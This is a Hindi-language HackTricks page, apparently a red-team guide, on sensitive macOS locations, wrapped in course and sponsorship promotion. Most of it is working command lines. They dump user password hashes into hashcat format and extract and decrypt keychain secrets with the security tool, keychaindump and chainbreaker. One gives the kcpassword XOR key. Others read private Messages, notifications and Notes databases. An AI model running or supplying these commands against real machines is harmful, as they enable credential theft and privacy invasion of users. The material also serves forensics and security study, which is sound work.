# macOS संवेदनशील स्थान

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live) पर **फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें और PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

## पासवर्ड

### छाया पासवर्ड

छाया पासवर्ड उपयोगकर्ता के कॉन्फ़िगरेशन के साथ संग्रहीत होता है पीलिस्ट में जो **`/var/db/dslocal/nodes/Default/users/`** में स्थित है।\
निम्नलिखित वनलाइनर का उपयोग किया जा सकता है **उपयोगकर्ताओं के बारे में सभी जानकारी को डंप करने** के लिए (हैश जानकारी सहित):

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**इस तरह के स्क्रिप्ट**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) या [**यह एक**](https://github.com/octomagon/davegrohl.git) का उपयोग **हैश** को **हैशकैट** **स्वरूप** में बदलने के लिए किया जा सकता है।

एक वैकल्पिक वन-लाइनर जो सभी गैर-सेवा खातों के क्रेडेंशियल को हैशकैट स्वरूप में डंप करेगा `-m 7100` (macOS PBKDF2-SHA512): 

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### कीचेन डंप

ध्यान दें कि **पासवर्ड डिक्रिप्ट करने के लिए सुरक्षा बाइनरी का उपयोग करते समय**, कई प्रॉम्प्ट्स उपयोगकर्ता से इस ऑपरेशन की अनुमति देने के लिए पूछेंगे।
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
इस टिप्पणी के आधार पर [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) लगता है कि ये उपकरण Big Sur में अब काम नहीं कर रहे हैं।
{% endhint %}

### Keychaindump Overview

एक उपकरण जिसे **keychaindump** नाम दिया गया है, मैकओएस की कीचेन से पासवर्ड निकालने के लिए विकसित किया गया है, लेकिन नए मैकओएस संस्करणों जैसे Big Sur पर प्रतिबंधित है, जैसा कि एक [चर्चा](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) में दर्शाया गया है। **keychaindump** का उपयोग अटैकर को **root** तक पहुंचने और वर्चस्व को उन्नत करने की आवश्यकता होती है। यह उपकरण उस तथ्य का शोषण करता है कि कीचेन डिफ़ॉल्ट रूप से उपयोगकर्ता लॉगिन के बाद अनलॉक होता है ताकि अनुकूलता के लिए, एप्लिकेशन उपयोगकर्ता के पासवर्ड को बार-बार दर्ज किए बिना इसे एक्सेस कर सकें। हालांकि, अगर एक उपयोगकर्ता हर उपयोग के बाद अपनी कीचेन को लॉक करने का चयन करता है, तो **keychaindump** अप्रभावी हो जाता है।

**Keychaindump** एक विशेष प्रक्रिया को लक्ष्य बनाकर काम करता है जिसे **securityd** कहा जाता है, जिसे Apple ने एक ऑथराइज़ेशन और क्रिप्टोग्राफिक ऑपरेशन के लिए डेमन के रूप में वर्णित किया है, जो कीचेन तक पहुंचने के लिए महत्वपूर्ण है। निकालने की प्रक्रिया में उपयोगकर्ता के लॉगिन पासवर्ड से निकली एक **मास्टर की** की पहचान करना शामिल है। यह कुंजी कीचेन फ़ाइल को पढ़ने के लिए आवश्यक है। **keychaindump** उपयोगकर्ता के लॉगिन पासवर्ड से निकली एक **मास्टर की** को खोजने के लिए **securityd** की मेमोरी हीप को स्कैन करता है, `vmmap` कमांड का उपयोग करके, `MALLOC_TINY` के रूप में फ़्लैग किए गए क्षेत्रों में संभावित कुंजियों की खोज करता है। इन मेमोरी स्थानों की जांच के लिए निम्नलिखित कमांड का उपयोग किया जाता है:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
उम्मीदवार मास्टर कुंजियों की संभावित पहचान के बाद, **keychaindump** विशेष पैटर्न (`0x0000000000000018`) के लिए हीप्स के माध्यम से खोज करता है जो मास्टर कुंजी के लिए उम्मीदवार को दर्शाता है। इस कुंजी का उपयोग करने के लिए और भी कदम आवश्यक है, जैसा **keychaindump** के स्रोत कोड में विस्तार से वर्णित है। इस क्षेत्र पर ध्यान केंद्रित करने वाले विश्लेषकों को ध्यान देना चाहिए कि कुंजीचैन को डिक्रिप्ट करने के लिए महत्वपूर्ण डेटा **securityd** प्रक्रिया की मेमोरी में संग्रहीत है। **keychaindump** चलाने के लिए एक उदाहरण कमांड है:
```bash
sudo ./keychaindump
```
### चेनब्रेकर

[**चेनब्रेकर**](https://github.com/n0fate/chainbreaker) का उपयोग एक OSX कीचेन से निम्नलिखित प्रकार की जानकारी को एक फोरेंसिक धारित तरीके से निकालने के लिए किया जा सकता है:

* हैश वाला Keychain पासवर्ड, [hashcat](https://hashcat.net/hashcat/) या [John the Ripper](https://www.openwall.com/john/) के साथ क्रैकिंग के लिए उपयुक्त
* इंटरनेट पासवर्ड
* जेनेरिक पासवर्ड
* निजी कुंजी
* सार्वजनिक कुंजी
* X509 प्रमाणपत्र
* सुरक्षित नोट्स
* एप्पलशेयर पासवर्ड

कीचेन अनलॉक पासवर्ड, [volafox](https://github.com/n0fate/volafox) या [volatility](https://github.com/volatilityfoundation/volatility) का उपयोग करके प्राप्त मास्टर कुंजी, या सिस्टमकी जैसा अनलॉक फ़ाइल के साथ, चेनब्रेकर भी सादा पासवर्ड प्रदान करेगा।

इनमें से किसी एक तरीके से Keychain को अनलॉक किया बिना, चेनब्रेकर सभी अन्य उपलब्ध जानकारी को प्रदर्शित करेगा।

#### **Keychain कुंजियों को डंप करें**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **सिस्टमकी के साथ कीचेन कुंजी (साथ में पासवर्ड) डंप करें**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **कुंजीथल कुंजी (साथ में पासवर्ड) को डंप करें हैश को क्रैक करें**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **मेमोरी डंप के साथ कीचेन कुंजी (पासवर्ड के साथ) डंप करें**

[इन कदमों का पालन करें](..#dumping-memory-with-osxpmem) एक **मेमोरी डंप** करने के लिए
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **उपयोगकर्ता के पासवर्ड का उपयोग करके कीचेन कुंजी (साथ में पासवर्ड) डंप करें**

यदि आप उपयोगकर्ता का पासवर्ड जानते हैं तो आप इसका उपयोग करके **उपयोगकर्ता की कीचेन कुंजी को डंप और डिक्रिप्ट** कर सकते हैं।
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

**kcpassword** फ़ाइल एक फ़ाइल है जो **उपयोगकर्ता का लॉगिन पासवर्ड** रखती है, लेकिन केवल तभी जब सिस्टम के मालिक ने **स्वचालित लॉगिन** को सक्षम किया है। इसलिए, उपयोगकर्ता को पासवर्ड के बिना स्वचालित रूप से लॉग इन किया जाएगा (जो बहुत ही सुरक्षित नहीं है)।

पासवर्ड **`/etc/kcpassword`** फ़ाइल में **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** कुंजी के साथ xored के साथ संग्रहीत है। यदि उपयोगकर्ता का पासवर्ड कुंजी से लंबा है, तो कुंजी का पुनः उपयोग किया जाएगा।\
इससे पासवर्ड को पुनः प्राप्त करना काफी आसान बना देता है, उदाहरण के लिए [**इस**](https://gist.github.com/opshope/32f65875d45215c3677d) जैसे स्क्रिप्ट का उपयोग करके।

## डेटाबेस में दिलचस्प जानकारी

### संदेश
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### सूचनाएं

आप `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/` में सूचनाएं डेटा पा सकते हैं।

अधिकांश दिलचस्प जानकारी **ब्लॉब** में होगी। इसलिए आपको उस सामग्री को **निकालना** होगा और **मानव** **पठनीय** में **परिवर्तित** करना होगा या **`strings`** का उपयोग करना होगा। इसको एक्सेस करने के लिए आप यह कर सकते हैं:
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
{% endcode %}

### नोट्स

उपयोगकर्ताओं के **नोट्स** को `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite` में ढूंढा जा सकता है।

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह **The PEASS Family** की खोज करें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें और PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github रेपो में।

</details>
